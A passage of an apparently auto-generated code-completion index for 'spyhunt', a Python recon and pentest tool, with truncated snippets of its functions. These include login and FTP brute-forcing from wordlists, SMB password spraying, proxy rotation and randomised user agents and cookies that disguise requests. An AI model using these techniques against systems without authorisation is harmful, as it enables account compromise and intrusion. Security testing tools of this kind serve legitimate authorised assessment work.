        "description": "dnsparser",
        "peekOfCode": "def extract_txt_records(data):\n    return data.get('txt', [])\ndef extract_resolvers(data):\n    return data.get('resolver', [])\ndef extract_soa_records(data):\n    return data.get('soa', [])\ndef save_to_file(items, output_file, header=None):\n    try:\n        with open(output_file, 'w') as file:\n            if header:",
        "detail": "dnsparser",
        "documentation": {}
    },
    {
        "label": "extract_resolvers",
        "kind": 2,
        "importPath": "dnsparser",
        "description": "dnsparser",
        "peekOfCode": "def extract_resolvers(data):\n    return data.get('resolver', [])\ndef extract_soa_records(data):\n    return data.get('soa', [])\ndef save_to_file(items, output_file, header=None):\n    try:\n        with open(output_file, 'w') as file:\n            if header:\n                file.write(f\"{header}\\n\")\n            for item in items:",
        "detail": "dnsparser",
        "documentation": {}
    },
    {
        "label": "extract_soa_records",
        "kind": 2,
        "importPath": "dnsparser",
        "description": "dnsparser",
        "peekOfCode": "def extract_soa_records(data):\n    return data.get('soa', [])\ndef save_to_file(items, output_file, header=None):\n    try:\n        with open(output_file, 'w') as file:\n            if header:\n                file.write(f\"{header}\\n\")\n            for item in items:\n                file.write(f\"{item}\\n\")\n        print(f\"Data saved to {output_file}\")",
        "detail": "dnsparser",
        "documentation": {}
    },
    {
        "label": "save_to_file",
        "kind": 2,
        "importPath": "dnsparser",
        "description": "dnsparser",
        "peekOfCode": "def save_to_file(items, output_file, header=None):\n    try:\n        with open(output_file, 'w') as file:\n            if header:\n                file.write(f\"{header}\\n\")\n            for item in items:\n                file.write(f\"{item}\\n\")\n        print(f\"Data saved to {output_file}\")\n    except IOError as e:\n        print(f\"Error writing to file {output_file}: {e}\")",
        "detail": "dnsparser",
        "documentation": {}
    },
    {
        "label": "print_soa_records",
        "kind": 2,
        "importPath": "dnsparser",
        "description": "dnsparser",
        "peekOfCode": "def print_soa_records(soa_records):\n    print(\"SOA Records:\")\n    for i, soa in enumerate(soa_records, start=1):\n        print(f\"  SOA Record {i}:\")\n        print(f\"    Name: {soa.get('name', 'N/A')}\")\n        print(f\"    NS: {soa.get('ns', 'N/A')}\")\n        print(f\"    Mailbox: {soa.get('mailbox', 'N/A')}\")\n        print(f\"    Serial: {soa.get('serial', 'N/A')}\")\n        print(f\"    Refresh: {soa.get('refresh', 'N/A')}\")\n        print(f\"    Retry: {soa.get('retry', 'N/A')}\")",
        "detail": "dnsparser",
        "documentation": {}
    },
    {
        "label": "main",
        "kind": 2,
        "importPath": "dnsparser",
        "description": "dnsparser",
        "peekOfCode": "def main():\n    # Load JSON data\n    json_data = load_json('dnsscan.json')\n    if not json_data:\n        return\n    # Extract fields\n    host = json_data.get('host', 'N/A')\n    ttl = json_data.get('ttl', 'N/A')\n    status_code = json_data.get('status_code', 'N/A')\n    timestamp = json_data.get('timestamp', 'N/A')",
        "detail": "dnsparser",
        "documentation": {}
    },
    {
        "label": "run_command",
        "kind": 2,
        "importPath": "install",
        "description": "install",
        "peekOfCode": "def run_command(cmd):\n    try:\n        print(f\"Running command: {cmd}\")  # Removed colorama formatting\n        output = subprocess.check_output(cmd, shell=True, stderr=subprocess.STDOUT, universal_newlines=True)\n        print(f\"Command output: {output.strip()}\")  # Removed colorama formatting\n        return output\n    except subprocess.CalledProcessError as e:\n        print(f\"Failed to run command: {cmd}\")\n        print(f\"Error: {e.output}\")\n        return None",
        "detail": "install",
        "documentation": {}
    },
    {
        "label": "detect_package_manager",
        "kind": 2,
        "importPath": "install",
        "description": "install",
        "peekOfCode": "def detect_package_manager():\n    package_managers = [\n        (\"apt\", \"apt\"),\n        (\"dnf\", \"dnf\"),\n        (\"yum\", \"yum\"),\n        (\"pacman\", \"pacman\"),\n        (\"zypper\", \"zypper\"),\n        (\"apk\", \"apk\")\n    ]\n    for pm, cmd in package_managers:",
        "detail": "install",
        "documentation": {}
    },
    {
        "label": "install_package",
        "kind": 2,
        "importPath": "install",
        "description": "install",
        "peekOfCode": "def install_package(package, manager):\n    if manager == \"apt\":\n        return run_command(f\"sudo apt install -y {package}\")\n    elif manager == \"dnf\" or manager == \"yum\":\n        return run_command(f\"sudo {manager} install -y {package}\")\n    elif manager == \"pacman\":\n        return run_command(f\"sudo pacman -S --noconfirm {package}\")\n    elif manager == \"zypper\":\n        return run_command(f\"sudo zypper install -y {package}\")\n    elif manager == \"apk\":",
        "detail": "install",
        "documentation": {}
    },
    {
        "label": "install_tool",
        "kind": 2,
        "importPath": "install",
        "description": "install",
        "peekOfCode": "def install_tool(name, install_cmd, check_cmd=None):\n    if check_cmd is None:\n        check_cmd = name\n    if not which(check_cmd):\n        print(f\"Installing {name}...\")  # Removed colorama formatting\n        result = install_cmd()\n        if result is not None:\n            print(f\"{name} installed successfully\")  # Removed colorama formatting\n        else:\n            print(f\"Failed to install {name}\")  # Removed colorama formatting",
        "detail": "install",
        "documentation": {}
    },
    {
        "label": "install_go_tool",
        "kind": 2,
        "importPath": "install",
        "description": "install",
        "peekOfCode": "def install_go_tool(tool, package):\n    print(f\"Installing {tool}...\")  # Removed colorama formatting\n    if run_command(f\"go install {package}\") is not None:\n        go_path = run_command(\"go env GOPATH\").strip()\n        bin_path = os.path.join(go_path, \"bin\", tool)\n        if os.path.exists(bin_path):\n            run_command(f\"sudo mv {bin_path} /usr/local/bin/\")\n            print(f\"{tool} installed successfully\")  # Removed colorama formatting\n        else:\n            print(f\"Failed to find {tool} in GOPATH\")  # Removed colorama formatting",
        "detail": "install",
        "documentation": {}
    },
    {
        "label": "check_wsl",
        "kind": 2,
        "importPath": "install",
        "description": "install",
        "peekOfCode": "def check_wsl():\n    try:\n        if platform.system() == \"Linux\":\n            with open('/proc/version', 'r') as f:\n                return 'microsoft' in f.read().lower()\n    except (PermissionError, IOError) as e:\n        print(f\"Warning: Could not check WSL status: {e}\")\n    return False\ndef update_upgrade_system(package_manager):\n    print(f\"Updating and upgrading the system...\")  # Removed colorama formatting",
        "detail": "install",
        "documentation": {}
    },
    {
        "label": "update_upgrade_system",
        "kind": 2,
        "importPath": "install",
        "description": "install",
        "peekOfCode": "def update_upgrade_system(package_manager):\n    print(f\"Updating and upgrading the system...\")  # Removed colorama formatting\n    if package_manager == \"apt\":\n        run_command(\"sudo apt update && sudo apt upgrade -y\")\n    elif package_manager in [\"dnf\", \"yum\"]:\n        run_command(f\"sudo {package_manager} update -y\")\n    elif package_manager == \"pacman\":\n        run_command(\"sudo pacman -Syu --noconfirm\")\n    elif package_manager == \"zypper\":\n        run_command(\"sudo zypper update -y\")",
        "detail": "install",
        "documentation": {}
    },
    {
        "label": "ensure_pip_installed",
        "kind": 2,
        "importPath": "install",
        "description": "install",
        "peekOfCode": "def ensure_pip_installed(package_manager):\n    if not which(\"pip3\") and not which(\"pip\"):\n        print(f\"pip is not installed. Installing pip...\")  # Removed colorama formatting\n        if platform.system() == \"Linux\":\n            if package_manager == \"apt\":\n                run_command(\"sudo apt install -y python3-pip\")\n            elif package_manager in [\"dnf\", \"yum\"]:\n                run_command(f\"sudo {package_manager} install -y python3-pip\")\n            elif package_manager == \"pacman\":\n                run_command(\"sudo pacman -S --noconfirm python-pip\")",
        "detail": "install",
        "documentation": {}
    },
    {
        "label": "main",
        "kind": 2,
        "importPath": "install",
        "description": "install",
        "peekOfCode": "def main():\n    system = platform.system()\n    is_wsl = check_wsl()\n    if is_wsl:\n        print(f\"Detected Windows Subsystem for Linux (WSL)\")  # Removed colorama formatting\n    if system == \"Linux\":\n        package_manager = detect_package_manager()\n        if package_manager is None:\n            print(f\"Unable to detect package manager. Please install packages manually.\")  # Removed colorama formatting\n            return",
        "detail": "install",
        "documentation": {}
    },
    {
        "label": "main",
        "kind": 2,
        "importPath": "spyhunt",
        "description": "spyhunt",
        "peekOfCode": "def main():\n    import sys\n    # Re-execute the script as if run directly, so all logic and argparsing works\n    # This is a simple way to make the CLI entry point work for now\n    sys.argv[0] = \"spyhunt.py\"\n    with open(__file__, encoding=\"utf-8\") as f:\n        code = compile(f.read(), __file__, \"exec\")\n        exec(code, globals())\nfrom colorama import Fore, init, Style\nfrom os import path",
        "detail": "spyhunt",
        "documentation": {}
    },
    {
        "label": "commands",
        "kind": 2,
        "importPath": "spyhunt",
        "description": "spyhunt",
        "peekOfCode": "def commands(cmd):\n    try:\n        subprocess.check_call(cmd, shell=True)\n    except:\n        pass\ndef scan(command: str) -> str:\n    cmd = command\n    p = subprocess.Popen(\n        cmd, shell=True, stdout=subprocess.PIPE, stderr=subprocess.STDOUT\n    )",
        "detail": "spyhunt",
        "documentation": {}
    },
    {
        "label": "scan",
        "kind": 2,
        "importPath": "spyhunt",
        "description": "spyhunt",
        "peekOfCode": "def scan(command: str) -> str:\n    cmd = command\n    p = subprocess.Popen(\n        cmd, shell=True, stdout=subprocess.PIPE, stderr=subprocess.STDOUT\n    )\n    out, err = p.communicate()\n    out = out.decode()\n    return out\nparser = argparse.ArgumentParser()\ngroup = parser.add_mutually_exclusive_group()",
        "detail": "spyhunt",
        "documentation": {}
    },
    {
        "label": "scan_ip_info",
        "kind": 2,
        "importPath": "spyhunt",
        "description": "spyhunt",
        "peekOfCode": "def scan_ip_info(target, token):\n    \"\"\"Get IP ranges and ASN information using IPinfo API\"\"\"\n    try:\n        # First resolve domain to IP if target is a domain\n        try:\n            ip = socket.gethostbyname(target)\n            if ip != target:\n                print(f\"{Fore.CYAN}Resolved {target} to {ip}{Style.RESET_ALL}\\n\")\n        except socket.gaierror:\n            print(",
        "detail": "spyhunt",
        "documentation": {}
    },
    {
        "label": "process_domain",
        "kind": 2,
        "importPath": "spyhunt",
        "description": "spyhunt",
        "peekOfCode": "def process_domain(domain, save_file=None, shodan_api=None):\n    \"\"\"Process a single domain for subdomain enumeration\"\"\"\n    current_script_dir = os.path.dirname(os.path.abspath(__file__))\n    spotter_path = os.path.join(current_script_dir, \"scripts\", \"spotter.sh\")\n    certsh_path = os.path.join(current_script_dir, \"scripts\", \"certsh.sh\")\n    results = []\n    # Subfinder\n    cmd = f\"subfinder -d {domain} -silent\"\n    p = subprocess.Popen(\n        cmd, shell=True, stdout=subprocess.PIPE, stderr=subprocess.STDOUT",
        "detail": "spyhunt",
        "documentation": {}
    },
    {
        "label": "check_gcp_bucket",
        "kind": 2,
        "importPath": "spyhunt",
        "description": "spyhunt",
        "peekOfCode": "def check_gcp_bucket(bucket_name):\n    \"\"\"\n    Check if a GCP Storage bucket exists and is publicly accessible\n    Args:\n        bucket_name: Name of the bucket to check\n    Returns:\n        Bucket URL if found and accessible, None otherwise\n    \"\"\"\n    try:\n        bucket_url = f\"https://storage.googleapis.com/{bucket_name}/\"",
        "detail": "spyhunt",
        "documentation": {}
    },
    {
        "label": "check_gcp_exposure",
        "kind": 2,
        "importPath": "spyhunt",
        "description": "spyhunt",
        "peekOfCode": "def check_gcp_exposure(domain):\n    \"\"\"\n    Check for GCP resource exposure for a domain\n    Args:\n        domain: Domain to check\n    \"\"\"\n    try:\n        # Clean up the domain to extract just the domain name\n        if domain.startswith((\"http://\", \"https://\")):\n            parsed_url = urlparse(domain)",
        "detail": "spyhunt",
        "documentation": {}
    },
    {
        "label": "check_gcp_project",
        "kind": 2,
        "importPath": "spyhunt",
        "description": "spyhunt",
        "peekOfCode": "def check_gcp_project(pattern):\n    \"\"\"\n    Check a single GCP project pattern\n    Args:\n        pattern: Project pattern to check\n    \"\"\"\n    try:\n        url = f\"https://cloudresourcemanager.googleapis.com/v1/projects/{pattern}\"\n        response = requests.get(url, timeout=10)\n        if response.status_code == 200:",
        "detail": "spyhunt",
        "documentation": {}
    },
    {
        "label": "test_proxy",
        "kind": 2,
        "importPath": "spyhunt",
        "description": "spyhunt",
        "peekOfCode": "def test_proxy(proxy, test_url=\"https://www.google.com\", timeout=3):\n    \"\"\"Test if a proxy works with both HTTP and HTTPS - optimized for speed\"\"\"\n    try:\n        # Reduce timeout for faster testing\n        if proxy.startswith(\"http\"):\n            proxies = {\"http\": proxy, \"https\": proxy}\n        else:\n            proxies = {\"http\": f\"http://{proxy}\", \"https\": f\"http://{proxy}\"}\n        # Use HEAD request instead of GET for faster response\n        response = requests.head(",
        "detail": "spyhunt",
        "documentation": {}
    },
    {
        "label": "load_proxies",
        "kind": 2,
        "importPath": "spyhunt",
        "description": "spyhunt",
        "peekOfCode": "def load_proxies(proxy_file=None, test=True, max_workers=50):\n    \"\"\"Load proxies from a file and optionally test them in parallel\"\"\"\n    if not proxy_file or not os.path.exists(proxy_file):\n        return []\n    with open(proxy_file, \"r\") as f:\n        proxies = [x.strip() for x in f.readlines() if x.strip()]\n    print(\n        f\"{Fore.WHITE}[*] Loaded {Fore.MAGENTA}{len(proxies)} proxies from file{Style.RESET_ALL}\"\n    )\n    if test:",
        "detail": "spyhunt",
        "documentation": {}
    },
    {
        "label": "get_random_user_agent",
        "kind": 2,
        "importPath": "spyhunt",
        "description": "spyhunt",
        "peekOfCode": "def get_random_user_agent():\n    \"\"\"Generate a random user agent\"\"\"\n    try:\n        ua = UserAgent()\n        return ua.random\n    except:\n        # Fallback user agents if fake_useragent fails\n        user_agents = [\n            \"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36\",\n            \"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/14.1.1 Safari/605.1.15\",",
        "detail": "spyhunt",
        "documentation": {}
    },
    {
        "label": "password_wordlist",
        "kind": 2,
        "importPath": "spyhunt",
        "description": "spyhunt",
        "peekOfCode": "def password_wordlist(file: str) -> list:\n    with open(file, \"r\") as f:\n        passwords = [x.strip() for x in f.readlines()]\n    return passwords\ndef username_wordlist(file: str) -> list:\n    with open(file, \"r\") as f:\n        usernames = [x.strip() for x in f.readlines()]\n    return usernames\ndef randomize_cookies(base_cookies=None):\n    \"\"\"Generate randomized cookies\"\"\"",
        "detail": "spyhunt",
        "documentation": {}
    },
    {
        "label": "username_wordlist",
        "kind": 2,
        "importPath": "spyhunt",
        "description": "spyhunt",
        "peekOfCode": "def username_wordlist(file: str) -> list:\n    with open(file, \"r\") as f:\n        usernames = [x.strip() for x in f.readlines()]\n    return usernames\ndef randomize_cookies(base_cookies=None):\n    \"\"\"Generate randomized cookies\"\"\"\n    # Start with required cookies or empty dict\n    cookies = base_cookies.copy() if base_cookies else {}\n    # Add random tracking-like cookies\n    random_cookies = {",
        "detail": "spyhunt",
        "documentation": {}
    },
    {
        "label": "randomize_cookies",
        "kind": 2,
        "importPath": "spyhunt",
        "description": "spyhunt",
        "peekOfCode": "def randomize_cookies(base_cookies=None):\n    \"\"\"Generate randomized cookies\"\"\"\n    # Start with required cookies or empty dict\n    cookies = base_cookies.copy() if base_cookies else {}\n    # Add random tracking-like cookies\n    random_cookies = {\n        f\"_ga_{random.randint(1000, 9999)}\": f\"{uuid.uuid4()}\",\n        f\"visitor_id{random.randint(100, 999)}\": f\"{random.randint(10000, 999999)}\",\n        \"session_depth\": str(random.randint(1, 5)),\n        \"last_visit\": str(int(time.time()) - random.randint(3600, 86400)),",
        "detail": "spyhunt",
        "documentation": {}
    },
    {
        "label": "detect_2fa",
        "kind": 2,
        "importPath": "spyhunt",
        "description": "spyhunt",
        "peekOfCode": "def detect_2fa(response_text, response_url):\n    \"\"\"\n    Detect if the response indicates a 2FA challenge\n    Returns True if 2FA is detected, False otherwise\n    \"\"\"\n    # Convert to lowercase for case-insensitive matching\n    text_lower = response_text.lower()\n    url_lower = response_url.lower()\n    # Common 2FA indicators in response text\n    text_indicators = [",
        "detail": "spyhunt",
        "documentation": {}
    },
    {
        "label": "try_login_task",
        "kind": 2,
        "importPath": "spyhunt",
        "description": "spyhunt",
        "peekOfCode": "def try_login_task(\n    username,\n    password,\n    url,\n    form_data,\n    initial_url,\n    success_indicators,\n    verbose,\n    proxy=None,\n    user_agent=None,",
        "detail": "spyhunt",
        "documentation": {}
    },
    {
        "label": "bruteforce_login",
        "kind": 2,
        "importPath": "spyhunt",
        "description": "spyhunt",
        "peekOfCode": "def bruteforce_login(url, username_file, password_file, proxy_file=None, verbose=False):\n    try:\n        # Validate input files first\n        if not username_file or not password_file:\n            print(\n                f\"{Fore.RED}[!] Both username and password wordlists are required{Style.RESET_ALL}\"\n            )\n            return\n        if not os.path.exists(username_file):\n            print(",
        "detail": "spyhunt",
        "documentation": {}
    },
    {
        "label": "check_banner_vulnerabilities",
        "kind": 2,
        "importPath": "spyhunt",
        "description": "spyhunt",
        "peekOfCode": "def check_banner_vulnerabilities(banner):\n    print(\n        f\"{Fore.CYAN}[*] Analyzing banner for known vulnerabilities...{Style.RESET_ALL}\"\n    )\n    found_vuln = False\n    for vuln_sig, description in KNOWN_VULN_BANNERS.items():\n        if vuln_sig.lower() in banner.lower():\n            print(\n                f\"{Fore.RED}[!] Potential Vulnerability Found based on banner:{Style.RESET_ALL}\"\n            )",
        "detail": "spyhunt",
        "documentation": {}
    },
    {
        "label": "scan_ftp",
        "kind": 2,
        "importPath": "spyhunt",
        "description": "spyhunt",
        "peekOfCode": "def scan_ftp(\n    target_host,\n    target_port=DEFAULT_FTP_PORT,\n    user_list_path=None,\n    pass_list_path=None,\n    proxy_list_path=None,\n):\n    print(\n        f\"{Fore.MAGENTA}[+] Starting FTP Scan on {Fore.CYAN}{target_host}:{target_port}{Style.RESET_ALL}\"\n    )",
        "detail": "spyhunt",
        "documentation": {}
    },
    {
        "label": "smb_auto_pentest",
        "kind": 2,
        "importPath": "spyhunt",
        "description": "spyhunt",
        "peekOfCode": "def smb_auto_pentest(\n    target,\n    spray_userlist=None,\n    spray_passlist=None,\n    spray_password=None,\n    smb_user=None,\n    smb_pass=None,\n    smb_domain=\"\",\n):\n    from impacket.smbconnection import SMBConnection, SessionError",
        "detail": "spyhunt",
        "documentation": {}
    },
    {
        "label": "banner",
        "kind": 5,
        "importPath": "spyhunt",
        "description": "spyhunt",
        "peekOfCode": "banner = f\"\"\"\n  ██████  ██▓███ ▓██   ██▓ ██░ ██  █    ██  ███▄    █ ▄▄▄█████▓\n▒██    ▒ ▓██░  ██▒▒██  ██▒▓██░ ██▒ ██  ▓██▒ ██ ▀█   █ ▓  ██▒ ▓▒\n░ ▓██▄   ▓██░ ██▓▒ ▒██ ██░▒██▀▀██░▓██  ▒██░▓██  ▀█ ██▒▒ ▓██░ ▒░\n  ▒   ██▒▒██▄█▓▒ ▒ ░ ▐██▓░░▓█ ░██ ▓▓█  ░██░▓██▒  ▐▌██▒░ ▓██▓ ░ \n▒██████▒▒▒██▒ ░  ░ ░ ██▒▓░░▓█▒░██▓▒▒█████▓ ▒██░   ▓██░  ▒██▒ ░ \n▒ ▒▓▒ ▒ ░▒▓▒░ ░  ░  ██▒▒▒  ▒ ░░▒░▒░▒▓▒ ▒ ▒ ░ ▒░   ▒ ▒   ▒ ░░   \n░ ░▒  ░ ░░▒ ░     ▓██ ░▒░  ▒ ░▒░ ░░░▒░ ░ ░ ░ ░░   ░ ▒░    ░    \n░  ░  ░  ░░       ▒ ▒ ░░   ░  ░░ ░ ░░░ ░ ░    ░   ░ ░   ░      \n      ░           ░ ░      ░  ░  ░   ░              ░         ",
        "detail": "spyhunt",
        "documentation": {}
    },
    {
        "label": "parser",
        "kind": 5,
        "importPath": "spyhunt",
        "description": "spyhunt",
        "peekOfCode": "parser = argparse.ArgumentParser()\ngroup = parser.add_mutually_exclusive_group()\nupdate_group = parser.add_argument_group(\"Update\")\nnuclei_group = parser.add_argument_group(\"Nuclei Scans\")\nvuln_group = parser.add_argument_group(\"Vulnerability\")\ncrawlers_group = parser.add_argument_group(\"Crawlers\")\npassiverecon_group = parser.add_argument_group(\"Passive Recon\")\nfuzzing_group = parser.add_argument_group(\"Fuzzing\")\nportscanning_group = parser.add_argument_group(\"Port Scanning\")\nbruteforcing_group = parser.add_argument_group(\"Bruteforcing\")",
        "detail": "spyhunt",
        "documentation": {}
    },
    {
        "label": "group",
        "kind": 5,
        "importPath": "spyhunt",
        "description": "spyhunt",
        "peekOfCode": "group = parser.add_mutually_exclusive_group()\nupdate_group = parser.add_argument_group(\"Update\")\nnuclei_group = parser.add_argument_group(\"Nuclei Scans\")\nvuln_group = parser.add_argument_group(\"Vulnerability\")\ncrawlers_group = parser.add_argument_group(\"Crawlers\")\npassiverecon_group = parser.add_argument_group(\"Passive Recon\")\nfuzzing_group = parser.add_argument_group(\"Fuzzing\")\nportscanning_group = parser.add_argument_group(\"Port Scanning\")\nbruteforcing_group = parser.add_argument_group(\"Bruteforcing\")\nftp_group = parser.add_argument_group(\"FTP Scanning\")  # New argument group",
        "detail": "spyhunt",
        "documentation": {}
    },
    {
        "label": "update_group",
        "kind": 5,
        "importPath": "spyhunt",
        "description": "spyhunt",
        "peekOfCode": "update_group = parser.add_argument_group(\"Update\")\nnuclei_group = parser.add_argument_group(\"Nuclei Scans\")\nvuln_group = parser.add_argument_group(\"Vulnerability\")\ncrawlers_group = parser.add_argument_group(\"Crawlers\")\npassiverecon_group = parser.add_argument_group(\"Passive Recon\")\nfuzzing_group = parser.add_argument_group(\"Fuzzing\")\nportscanning_group = parser.add_argument_group(\"Port Scanning\")\nbruteforcing_group = parser.add_argument_group(\"Bruteforcing\")\nftp_group = parser.add_argument_group(\"FTP Scanning\")  # New argument group\ngroup.add_argument(",
        "detail": "spyhunt",
        "documentation": {}
    },
    {
        "label": "nuclei_group",
        "kind": 5,
        "importPath": "spyhunt",
        "description": "spyhunt",
        "peekOfCode": "nuclei_group = parser.add_argument_group(\"Nuclei Scans\")\nvuln_group = parser.add_argument_group(\"Vulnerability\")\ncrawlers_group = parser.add_argument_group(\"Crawlers\")\npassiverecon_group = parser.add_argument_group(\"Passive Recon\")\nfuzzing_group = parser.add_argument_group(\"Fuzzing\")\nportscanning_group = parser.add_argument_group(\"Port Scanning\")\nbruteforcing_group = parser.add_argument_group(\"Bruteforcing\")\nftp_group = parser.add_argument_group(\"FTP Scanning\")  # New argument group\ngroup.add_argument(\n    \"-sv\", \"--save\", action=\"store\", help=\"save output to file\", metavar=\"filename.txt\"",
        "detail": "spyhunt",
        "documentation": {}
    },
    {
        "label": "vuln_group",
        "kind": 5,
        "importPath": "spyhunt",
        "description": "spyhunt",
        "peekOfCode": "vuln_group = parser.add_argument_group(\"Vulnerability\")\ncrawlers_group = parser.add_argument_group(\"Crawlers\")\npassiverecon_group = parser.add_argument_group(\"Passive Recon\")\nfuzzing_group = parser.add_argument_group(\"Fuzzing\")\nportscanning_group = parser.add_argument_group(\"Port Scanning\")\nbruteforcing_group = parser.add_argument_group(\"Bruteforcing\")\nftp_group = parser.add_argument_group(\"FTP Scanning\")  # New argument group\ngroup.add_argument(\n    \"-sv\", \"--save\", action=\"store\", help=\"save output to file\", metavar=\"filename.txt\"\n)",
        "detail": "spyhunt",
        "documentation": {}
    },
    {
        "label": "crawlers_group",
        "kind": 5,
        "importPath": "spyhunt",
        "description": "spyhunt",
        "peekOfCode": "crawlers_group = parser.add_argument_group(\"Crawlers\")\npassiverecon_group = parser.add_argument_group(\"Passive Recon\")\nfuzzing_group = parser.add_argument_group(\"Fuzzing\")\nportscanning_group = parser.add_argument_group(\"Port Scanning\")\nbruteforcing_group = parser.add_argument_group(\"Bruteforcing\")\nftp_group = parser.add_argument_group(\"FTP Scanning\")  # New argument group\ngroup.add_argument(\n    \"-sv\", \"--save\", action=\"store\", help=\"save output to file\", metavar=\"filename.txt\"\n)\ngroup.add_argument(",
        "detail": "spyhunt",
        "documentation": {}
    },
    {
        "label": "passiverecon_group",
        "kind": 5,
        "importPath": "spyhunt",
        "description": "spyhunt",
        "peekOfCode": "passiverecon_group = parser.add_argument_group(\"Passive Recon\")\nfuzzing_group = parser.add_argument_group(\"Fuzzing\")\nportscanning_group = parser.add_argument_group(\"Port Scanning\")\nbruteforcing_group = parser.add_argument_group(\"Bruteforcing\")\nftp_group = parser.add_argument_group(\"FTP Scanning\")  # New argument group\ngroup.add_argument(\n    \"-sv\", \"--save\", action=\"store\", help=\"save output to file\", metavar=\"filename.txt\"\n)\ngroup.add_argument(\n    \"-wl\", \"--wordlist\", action=\"store\", help=\"wordlist to use\", metavar=\"filename.txt\"",
        "detail": "spyhunt",
        "documentation": {}
    },
    {
        "label": "fuzzing_group",
        "kind": 5,
        "importPath": "spyhunt",
        "description": "spyhunt",
        "peekOfCode": "fuzzing_group = parser.add_argument_group(\"Fuzzing\")\nportscanning_group = parser.add_argument_group(\"Port Scanning\")\nbruteforcing_group = parser.add_argument_group(\"Bruteforcing\")\nftp_group = parser.add_argument_group(\"FTP Scanning\")  # New argument group\ngroup.add_argument(\n    \"-sv\", \"--save\", action=\"store\", help=\"save output to file\", metavar=\"filename.txt\"\n)\ngroup.add_argument(\n    \"-wl\", \"--wordlist\", action=\"store\", help=\"wordlist to use\", metavar=\"filename.txt\"\n)",
        "detail": "spyhunt",
        "documentation": {}
    },
    {
        "label": "portscanning_group",
        "kind": 5,
        "importPath": "spyhunt",
        "description": "spyhunt",
        "peekOfCode": "portscanning_group = parser.add_argument_group(\"Port Scanning\")\nbruteforcing_group = parser.add_argument_group(\"Bruteforcing\")\nftp_group = parser.add_argument_group(\"FTP Scanning\")  # New argument group\ngroup.add_argument(\n    \"-sv\", \"--save\", action=\"store\", help=\"save output to file\", metavar=\"filename.txt\"\n)\ngroup.add_argument(\n    \"-wl\", \"--wordlist\", action=\"store\", help=\"wordlist to use\", metavar=\"filename.txt\"\n)\nparser.add_argument(\"-th\", \"--threads\", type=str, help=\"default 25\", metavar=\"25\")",
        "detail": "spyhunt",
        "documentation": {}
    },
    {
        "label": "bruteforcing_group",
        "kind": 5,
        "importPath": "spyhunt",
        "description": "spyhunt",
        "peekOfCode": "bruteforcing_group = parser.add_argument_group(\"Bruteforcing\")\nftp_group = parser.add_argument_group(\"FTP Scanning\")  # New argument group\ngroup.add_argument(\n    \"-sv\", \"--save\", action=\"store\", help=\"save output to file\", metavar=\"filename.txt\"\n)\ngroup.add_argument(\n    \"-wl\", \"--wordlist\", action=\"store\", help=\"wordlist to use\", metavar=\"filename.txt\"\n)\nparser.add_argument(\"-th\", \"--threads\", type=str, help=\"default 25\", metavar=\"25\")\npassiverecon_group.add_argument(",
        "detail": "spyhunt",
        "documentation": {}
    },
    {
        "label": "ftp_group",
        "kind": 5,
        "importPath": "spyhunt",
        "description": "spyhunt",
        "peekOfCode": "ftp_group = parser.add_argument_group(\"FTP Scanning\")  # New argument group\ngroup.add_argument(\n    \"-sv\", \"--save\", action=\"store\", help=\"save output to file\", metavar=\"filename.txt\"\n)\ngroup.add_argument(\n    \"-wl\", \"--wordlist\", action=\"store\", help=\"wordlist to use\", metavar=\"filename.txt\"\n)\nparser.add_argument(\"-th\", \"--threads\", type=str, help=\"default 25\", metavar=\"25\")\npassiverecon_group.add_argument(\n    \"-s\", type=str, help=\"scan for subdomains\", metavar=\"domain.com\"",
        "detail": "spyhunt",
        "documentation": {}
    },
    {
        "label": "cloud_group",
        "kind": 5,
        "importPath": "spyhunt",
        "description": "spyhunt",
        "peekOfCode": "cloud_group = parser.add_argument_group(\"Cloud Security\")\ncloud_group.add_argument(\n    \"-aws\",\n    \"--aws-scan\",\n    type=str,\n    help=\"Scan for exposed AWS resources\",\n    metavar=\"domain.com\",\n)\ncloud_group.add_argument(\n    \"-az\",",
        "detail": "spyhunt",
        "documentation": {}
    },
    {
        "label": "ip_group",
        "kind": 5,
        "importPath": "spyhunt",
        "description": "spyhunt",
        "peekOfCode": "ip_group = parser.add_argument_group(\"IP Information\")\nip_group.add_argument(\n    \"--ipinfo\", type=str, help=\"Get IP info for a company domain/IP\", metavar=\"TARGET\"\n)\nip_group.add_argument(\"--token\", type=str, help=\"IPinfo API token\", metavar=\"TOKEN\")\nip_group.add_argument(\n    \"--save-ranges\", type=str, help=\"Save IP ranges to file\", metavar=\"FILENAME\"\n)\nparser.add_argument(\n    \"--forbidden_domains\",",
        "detail": "spyhunt",
        "documentation": {}
    },
    {
        "label": "auto_smb_group",
        "kind": 5,
        "importPath": "spyhunt",
        "description": "spyhunt",
        "peekOfCode": "auto_smb_group = parser.add_argument_group(\"SMB Automated Pentest\")\nauto_smb_group.add_argument(\"--smb_scan\", action=\"store_true\", help=\"Run SMB scan\")\nauto_smb_group.add_argument(\n    \"--smb_auto\", action=\"store_true\", help=\"Run automated SMB pentest\"\n)\nauto_smb_group.add_argument(\n    \"--spray-userlist\", type=str, help=\"User list for password spraying\"\n)\nauto_smb_group.add_argument(\n    \"--spray-passlist\", type=str, help=\"Password list for password spraying\"",
        "detail": "spyhunt",
        "documentation": {}
    },
    {
        "label": "args",
        "kind": 5,
        "importPath": "spyhunt",
        "description": "spyhunt",
        "peekOfCode": "args = parser.parse_args()\n# Add new function for IP info scanning\ndef scan_ip_info(target, token):\n    \"\"\"Get IP ranges and ASN information using IPinfo API\"\"\"\n    try:\n        # First resolve domain to IP if target is a domain\n        try:\n            ip = socket.gethostbyname(target)\n            if ip != target:\n                print(f\"{Fore.CYAN}Resolved {target} to {ip}{Style.RESET_ALL}\\n\")",
        "detail": "spyhunt",
        "documentation": {}
    },
    {
        "label": "user_agent",
        "kind": 5,
        "importPath": "spyhunt",
        "description": "spyhunt",
        "peekOfCode": "user_agent = useragent_list.get_useragent()\nheader = {\"User-Agent\": user_agent}\nasync def update_script():\n    try:\n        # Store current version\n        current_version = \"1.0.0\"  # Replace with your version tracking system\n        backup_dir = \"backups\"\n        print(f\"{Fore.CYAN}Checking for updates...{Style.RESET_ALL}\")\n        # Create backups directory if it doesn't exist\n        if not os.path.exists(backup_dir):",
        "detail": "spyhunt",
        "documentation": {}
    },
    {
        "label": "header",
        "kind": 5,
        "importPath": "spyhunt",
        "description": "spyhunt",
